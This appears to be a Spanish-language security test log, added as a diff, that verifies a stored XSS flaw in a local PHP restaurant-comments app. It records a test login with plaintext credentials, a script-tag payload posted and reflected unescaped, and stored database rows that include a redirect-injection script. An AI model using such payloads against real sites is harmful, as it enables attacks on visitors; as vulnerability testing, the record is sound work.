@@ -1,0 +1,29 @@
+=== CP-COM-001: XSS almacenado ===
+--- Paso 1: login valido (admin@gmail.com/admin01) ---
+Login realizado.
+
+--- Paso 2: POST grcomentarios.php con payload XSS ---
+usuario=Administrador&comentario=<script>alert("XSS-CP-COM-001")</script>
+HTTP/1.1 302 Found
+Host: localhost:8000
+Date: Thu, 02 Jul 2026 00:46:12 GMT
+Connection: close
+X-Powered-By: PHP/8.5.8
+Expires: Thu, 19 Nov 1981 08:52:00 GMT
+Cache-Control: no-store, no-cache, must-revalidate
+Pragma: no-cache
+Location:index.php?id=1
+Content-type: text/html; charset=UTF-8
+
+
+--- Paso 3: recuperar index.php?id=1 y verificar si el payload aparece SIN escapar ---
+<script>alert("XSS-CP-COM-001")</script>
+
+--- Verificacion en BD (tabla comentarios) ---
+Id	usuario	comentario	id_restaurante
+7	Administrador	<script>alert("XSS-CP-COM-001")</script>	1
+6	Administrador	<script>window.location.href = "https://www.biobiochile.cl";</script>	2
+5	Administrador	<script>alert("No deberías estar acá, ahora eres responsable de lo que visitarás.");</script>	2
+
+--- Verificacion de ausencia de htmlspecialchars: se busca '&lt;script&gt;' (version escapada) ---
+NO se encontro version escapada -> el script se inserta LITERAL en el HTML, se ejecutaria en cualquier navegador con JS habilitado.
